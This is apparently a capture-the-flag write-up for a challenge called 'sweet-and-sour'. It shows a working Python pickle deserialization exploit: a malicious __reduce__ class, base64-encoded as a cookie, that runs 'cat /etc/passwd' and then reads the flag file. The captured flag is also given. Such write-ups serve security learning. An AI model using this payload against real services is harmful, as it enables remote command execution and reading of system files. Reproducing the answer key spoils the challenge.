## sweet-and-sour

This website uses Python and has a cookie in base64 format, so it raises suspicion that we are dealing with the Pickle module. We can sneak code into the cookie data by encoding and subsequently decoding it in base64 format. Here's what worked:

```
import pickle
import base64
import subprocess

class EvilPickle:
    def __reduce__(self):
        return (subprocess.check_output, (['cat', '/etc/passwd'],))

pickle_hehe = pickle.dumps(EvilPickle())

with open("pickle_hehe.data", "wb") as file:
    file.write(pickle_hehe)

encoded = base64.b64encode(pickle_hehe).decode()
print("Payload: " + str(encoded))
```

Run it in any compiler and use the output as data cookie. It displays the `/etc/passwd` contents. Now that we confirmed this method works, we can modify the original code and see what's inside `/home/ctf`. Finally, we have to change the line:
```
return(subprocess.check_output, (['cat', '/home/ctf/flag'],))
```

_CTF{ccc1ccef217ed19c492bdada049ad2b0fbf1adcb72a92f13ab153aae068f797f}_